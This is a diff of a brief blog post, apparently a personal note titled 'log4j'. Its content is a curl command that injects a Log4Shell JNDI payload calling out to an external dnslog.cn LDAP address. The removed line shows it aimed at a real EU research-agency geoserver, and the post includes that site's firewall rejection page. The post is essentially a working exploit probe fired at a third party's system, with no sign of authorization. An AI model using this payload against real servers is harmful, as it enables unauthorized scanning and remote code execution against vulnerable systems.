@@ -1,8 +1,8 @@
 ---
 layout: post
-title:  "12factor"
+title:  "log4j"
 date:   2021-12-09 13:11:00 +0200
 categories: tor
 ---
-curl https://urban.jrc.ec.europa.eu/geoserver -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
+curl https://hostname -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
 <html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please contact for more information jrc-waf[at]ec.europa.eu.<br><br>Your support ID is: 866684377438240381<br><br><a href='javascript:history.back();'>[Go Back]</a></body></html>(aoc)
